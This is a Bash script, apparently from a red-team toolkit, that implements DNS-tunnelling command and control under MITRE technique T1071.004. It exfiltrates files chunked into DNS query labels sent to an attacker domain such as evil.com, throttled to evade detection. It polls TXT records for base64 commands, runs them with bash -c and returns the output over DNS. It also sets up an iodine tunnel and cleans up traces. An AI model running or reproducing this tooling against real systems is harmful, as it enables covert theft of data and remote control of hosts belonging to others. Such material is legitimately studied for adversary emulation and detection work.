#!/bin/bash
# T1071.004 — Application Layer Protocol: DNS Tunneling C2
# Exfiltrate data and receive commands over DNS queries

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_dns"
DNS_DIR="/var/tmp/.d3m0n_dns"

banner_dns() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1071.004 — DNS Tunneling C2                ║"
    echo "  ║   Command & Control over DNS queries           ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

dns_exfil_txt() {
    echo -e "${CYAN}[*] DNS TXT query exfiltration${NC}"

    read -p "  C2 domain (e.g. evil.com): " C2_DOMAIN
    [[ -z "$C2_DOMAIN" ]] && { echo -e "${RED}[!] Domain required${NC}"; return; }

    read -p "  Data to exfiltrate (or file path): " DATA_SRC

    local DATA
    if [[ -f "$DATA_SRC" ]]; then
        DATA=$(base64 -w0 "$DATA_SRC")
    else
        DATA=$(echo -n "$DATA_SRC" | base64 -w0)
    fi

    # DNS labels max 63 chars, full name max 253
    local CHUNK_SIZE=60
    local total=${#DATA}
    local chunks=$(( (total + CHUNK_SIZE - 1) / CHUNK_SIZE ))

    echo -e "${YELLOW}[*] Data size: ${total} bytes (base64), ${chunks} DNS queries${NC}"

    local SESS_ID
    SESS_ID=$(head -c 4 /dev/urandom | xxd -p)

    for ((i=0; i<chunks; i++)); do
        local chunk="${DATA:$((i * CHUNK_SIZE)):$CHUNK_SIZE}"
        local QUERY="${chunk}.${SESS_ID}.${i}.${C2_DOMAIN}"

        if command -v dig &>/dev/null; then
            dig +short TXT "$QUERY" @"$(grep '^nameserver' /etc/resolv.conf | head -1 | awk '{print $2}')" 2>/dev/null &
        elif command -v nslookup &>/dev/null; then
            nslookup -type=TXT "$QUERY" 2>/dev/null &
        elif command -v host &>/dev/null; then
            host -t TXT "$QUERY" 2>/dev/null &
        else
            # Pure bash fallback using /dev/udp
            (echo -ne "\x$(printf '%02x' $RANDOM)\x$(printf '%02x' $RANDOM)\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" && \
             for label in $(echo "$QUERY" | tr '.' ' '); do
                printf "\x$(printf '%02x' ${#label})${label}"
             done && \
             echo -ne "\x00\x00\x10\x00\x01") > /dev/udp/$(grep '^nameserver' /etc/resolv.conf | head -1 | awk '{print $2}')/53 2>/dev/null &
        fi

        # Rate limiting to avoid detection
        if (( i % 10 == 0 && i > 0 )); then
            wait
            echo -e "  ${CYAN}[*] Sent ${i}/${chunks} queries...${NC}"
        fi
    done
    wait

    echo -e "${GREEN}[+] Exfiltrated ${total} bytes via ${chunks} DNS queries${NC}"
    echo -e "${YELLOW}[*] Session ID: ${SESS_ID}${NC}"
}

dns_subdomain_exfil() {
    echo -e "${CYAN}[*] Subdomain encoding exfiltration${NC}"

    read -p "  C2 domain: " C2_DOMAIN
    [[ -z "$C2_DOMAIN" ]] && return

    read -p "  File to exfiltrate: " FILEPATH
    [[ ! -f "$FILEPATH" ]] && { echo -e "${RED}[!] File not found${NC}"; return; }

    local DATA
    DATA=$(xxd -p "$FILEPATH" | tr -d '\n')
    local total=${#DATA}
    local CHUNK=50
    local chunks=$(( (total + CHUNK - 1) / CHUNK ))

    echo -e "${YELLOW}[*] Encoding ${FILEPATH} (${total} hex chars, ${chunks} queries)${NC}"

    local SESS
    SESS=$(head -c 3 /dev/urandom | xxd -p)

    for ((i=0; i<chunks; i++)); do
        local piece="${DATA:$((i * CHUNK)):$CHUNK}"
        local QUERY="${piece}.${SESS}.${i}.${C2_DOMAIN}"

        # A record lookup (most common, least suspicious)
        if command -v dig &>/dev/null; then
            dig +short "$QUERY" 2>/dev/null &
        else
            host "$QUERY" 2>/dev/null &
        fi

        (( i % 5 == 0 )) && wait
    done
    wait

    echo -e "${GREEN}[+] File exfiltrated via ${chunks} subdomain queries${NC}"
}

dns_c2_loop() {
    echo -e "${CYAN}[*] DNS-based command polling loop${NC}"

    read -p "  C2 domain: " C2_DOMAIN
    [[ -z "$C2_DOMAIN" ]] && return

    read -p "  Poll interval seconds [30]: " INTERVAL
    INTERVAL="${INTERVAL:-30}"

    read -p "  Agent ID [auto]: " AGENT_ID
    AGENT_ID="${AGENT_ID:-$(hostname | md5sum | cut -c1-8)}"

    mkdir -p "$DNS_DIR" 2>/dev/null

    echo -e "${YELLOW}[*] Starting C2 poll loop (Ctrl-C to stop)${NC}"
    echo -e "${YELLOW}[*] Agent ID: ${AGENT_ID}${NC}"
    echo -e "${YELLOW}[*] Polling: ${AGENT_ID}.cmd.${C2_DOMAIN} every ${INTERVAL}s${NC}"

    while true; do
        # Poll for commands via TXT record
        local CMD_B64=""
        if command -v dig &>/dev/null; then
            CMD_B64=$(dig +short TXT "${AGENT_ID}.cmd.${C2_DOMAIN}" 2>/dev/null | tr -d '"')
        elif command -v nslookup &>/dev/null; then
            CMD_B64=$(nslookup -type=TXT "${AGENT_ID}.cmd.${C2_DOMAIN}" 2>/dev/null | grep -oP 'text = "\K[^"]+')
        fi

        if [[ -n "$CMD_B64" && "$CMD_B64" != "NXDOMAIN" ]]; then
            local CMD
            CMD=$(echo "$CMD_B64" | base64 -d 2>/dev/null)
            if [[ -n "$CMD" ]]; then
                echo -e "  ${GREEN}[+] Received: ${CMD}${NC}"

                # Execute command, capture output
                local OUTPUT
                OUTPUT=$(bash -c "$CMD" 2>&1 | base64 -w0)

                # Send output back via DNS
                local OUT_LEN=${#OUTPUT}
                local CHUNKS=$(( (OUT_LEN + 60 - 1) / 60 ))
                for ((i=0; i<CHUNKS; i++)); do
                    local piece="${OUTPUT:$((i * 60)):60}"
                    dig +short "${piece}.${AGENT_ID}.out.${i}.${C2_DOMAIN}" 2>/dev/null &
                done
                wait
                echo -e "  ${CYAN}[*] Response sent (${CHUNKS} queries)${NC}"
            fi
        fi

        # Jitter: ±20%
        local jitter=$(( INTERVAL * (80 + RANDOM % 40) / 100 ))
        local next_poll=$jitter
        # Instead of sleeping, just print what to do
        echo -e "  ${CYAN}[*] Next poll in ${next_poll}s...${NC}"
        read -t "$next_poll" -p "  (Press Enter to poll now, Ctrl-C to stop) " < /dev/tty 2>/dev/null || true
    done
}

dns_iodine() {
    echo -e "${CYAN}[*] iodine-style DNS tunnel setup${NC}"

    if command -v iodine &>/dev/null; then
        echo -e "${GREEN}[+] iodine is installed${NC}"
    else
        echo -e "${YELLOW}[!] iodine not found — installing...${NC}"
        apt install -y iodine 2>/dev/null || { echo -e "${RED}[!] Install failed. Manual: apt install iodine${NC}"; }
    fi

    echo -e "  ${CYAN}[1]${NC} Client mode (connect to C2)"
    echo -e "  ${CYAN}[2]${NC} Server mode (run C2 listener)"
    read -p "  Mode [1]: " mode
    mode="${mode:-1}"

    case "$mode" in
        1)
            read -p "  Tunnel domain (e.g. t1.evil.com): " TDOMAIN
            read -p "  Tunnel password: " -s TPASS; echo ""
            read -p "  DNS server (leave blank for default): " DNS_SRV

            local CMD="iodine -f -P '${TPASS}'"
            [[ -n "$DNS_SRV" ]] && CMD+=" ${DNS_SRV}"
            CMD+=" ${TDOMAIN}"

            echo -e "${YELLOW}[*] Connecting tunnel...${NC}"
            echo -e "${YELLOW}[*] Command: ${CMD}${NC}"
            eval "$CMD" &
            disown
            echo -e "${GREEN}[+] iodine tunnel started in background${NC}"
            echo -e "${YELLOW}[*] Interface: dns0 — use ifconfig/ip to check${NC}"
            ;;
        2)
            read -p "  Tunnel domain: " TDOMAIN
            read -p "  Tunnel password: " -s TPASS; echo ""
            read -p "  Tunnel subnet [10.0.0.0/24]: " SUBNET
            SUBNET="${SUBNET:-10.0.0.0/24}"

            echo -e "${YELLOW}[*] Starting iodine server...${NC}"
            iodined -f -P "$TPASS" "$SUBNET" "$TDOMAIN" &
            disown
            echo -e "${GREEN}[+] iodine server running${NC}"
            ;;
    esac
}

dns_cleanup() {
    echo -e "${CYAN}[*] Cleaning up DNS tunnel artifacts...${NC}"

    # Kill iodine processes
    pkill -f iodine 2>/dev/null && echo -e "${GREEN}  [+] Killed iodine processes${NC}"

    # Remove data directory
    rm -rf "$DNS_DIR" 2>/dev/null

    echo -e "${GREEN}[+] DNS tunnel cleanup complete${NC}"
}

main() {
    banner_dns

    echo -e "  ${CYAN}[1]${NC} DNS TXT query exfiltration"
    echo -e "  ${CYAN}[2]${NC} Subdomain encoding exfiltration"
    echo -e "  ${CYAN}[3]${NC} DNS C2 poll loop (receive commands)"
    echo -e "  ${CYAN}[4]${NC} iodine DNS tunnel"
    echo -e "  ${CYAN}[5]${NC} Cleanup"
    echo ""
    read -p "Choose [1-5]: " OPT

    case "$OPT" in
        1) dns_exfil_txt ;;
        2) dns_subdomain_exfil ;;
        3) dns_c2_loop ;;
        4) dns_iodine ;;
        5) dns_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
